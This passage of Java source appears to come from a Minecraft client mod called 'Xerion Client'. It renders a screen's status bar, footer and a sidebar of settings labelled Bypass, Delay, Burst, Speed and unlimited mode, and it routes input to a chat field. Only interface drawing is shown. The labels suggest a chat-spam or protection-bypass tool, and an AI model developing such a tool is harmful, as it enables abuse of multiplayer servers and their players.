            String ml="♪  "+MSGS_MUSIC[Math.min(MSGS_MUSIC.length-1,(int)(ProfessorMusicManager.getVisualProgress()*MSGS_MUSIC.length))];
            ctx.drawText(textRenderer,ml,mbx,mby-10,(0x88<<24)|C_BLUE,false);
            ctx.fill(mbx-1,mby-1,mbx+mbw+1,mby+5,(0x44<<24)|C_BLUE);
            int hfw=(int)(mbw*hype);
            for(int xi=0;xi<hfw;xi++){float fr=(float)xi/mbw;int hbg=(int)MathHelper.lerp(fr,80f,230f);ctx.fill(mbx+xi,mby,mbx+xi+1,mby+4,0xFF000000|(0<<16)|(hbg<<8)|255);}
        }

        // ── Right info sidebar ────────────────────────────────────────────
        drawSidebar(ctx,bpx+PW-148,bpy+TH+TABH+14,142,PH-TH-TABH-70);

        // ── Status bar ────────────────────────────────────────────────────
        if(statusTimer>0){
            int a=Math.min(255,statusTimer*2);
            ctx.fill(bpx+6,bpy+PH-36,bpx+PW-6,bpy+PH-20,0xCC000011);
            ctx.fill(bpx+6,bpy+PH-36,bpx+9,   bpy+PH-20,(a<<24)|C_GOLD);
            ctx.fill(bpx+PW-9,bpy+PH-36,bpx+PW-6,bpy+PH-20,(a<<24)|C_GOLD);
            ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-31,(a<<24)|(statusColor&0xFFFFFF),false);
        }

        // ── Footer ────────────────────────────────────────────────────────
        ctx.fill(bpx,bpy+PH-18,bpx+PW,bpy+PH,0x22000011);
        String foot="© Xerion Client  |  by CrashPass  |  Use responsibly";
        ctx.drawText(textRenderer,foot,cx-textRenderer.getWidth(foot)/2,bpy+PH-12,(0x44<<24)|C_DBLUE,false);

        super.render(ctx,mx,my,delta);
    }

    private static final String[] MSGS_MUSIC={"Intro","Building...","Verse","Pre-chorus","DROP !","Chorus","Bridge","Final"};

    private void drawSidebar(DrawContext ctx,int x,int y,int w,int h){
        ctx.fill(x,y,x+w,y+h,0x55000A1E);
        ctx.fill(x,y,x+w,y+1,(0x88<<24)|C_BLUE);ctx.fill(x,y+h-1,x+w,y+h,(0x88<<24)|C_BLUE);
        ctx.fill(x,y,x+1,y+h,(0x88<<24)|C_BLUE);ctx.fill(x+w-1,y,x+w,y+h,(0x88<<24)|C_BLUE);
        ctx.drawText(textRenderer,"⬡  INFO",x+4,y+4,(0xAA<<24)|C_BLUE,false);
        ctx.fill(x,y+13,x+w,y+14,(0x44<<24)|C_BLUE);
        String[] lines={"Bypass: "+BP[bypass],"Delay: "+delay+"ms","Burst: "+burst+"x","Speed: "+speed+"x","Mode: "+(unlimited?"∞ UNL":"COUNT"),"Hype: "+(int)(hypeSmooth*100)+"%","Tab: "+TABS[tab]};
        for(int i=0;i<lines.length;i++)ctx.drawText(textRenderer,lines[i],x+4,y+18+i*12,(0x99<<24)|C_CYAN,false);
        // Hype indicator bar
        int iy=y+h-20;
        ctx.drawText(textRenderer,"DROP",x+4,iy-10,(0x66<<24)|C_BLUE,false);
        ctx.fill(x+4,iy,x+w-4,iy+6,(0x33<<24)|C_BLUE);
        ctx.fill(x+4,iy,x+4+(int)((w-8)*hypeSmooth),iy+6,(int)((0.8f+.2f*hypeSmooth)*255)<<24|(hypeSmooth>.7f?C_RED:C_BLUE));
        // Pulsing dot
        int da=(int)((0.5f+.5f*glow)*255);
        ctx.fill(x+w-8,y+4,x+w-4,y+8,(da<<24)|(hypeSmooth>.6f?C_RED:C_GREEN));
    }

    @Override public boolean mouseClicked(double mx,double my,int btn){if(numField!=null)numField.mouseClicked(mx,my,btn);if(chatField!=null)chatField.mouseClicked(mx,my,btn);return super.mouseClicked(mx,my,btn);}
    @Override public boolean keyPressed(int k,int sc,int mod){if(numField!=null&&numField.isFocused()&&numField.keyPressed(k,sc,mod))return true;if(chatField!=null&&chatField.isFocused()&&chatField.keyPressed(k,sc,mod))return true;return super.keyPressed(k,sc,mod);}
    @Override public boolean charTyped(char c,int mod){if(numField!=null&&numField.isFocused()&&numField.charTyped(c,mod))return true;if(chatField!=null&&chatField.isFocused()&&chatField.charTyped(c,mod))return true;return super.charTyped(c,mod);}
}
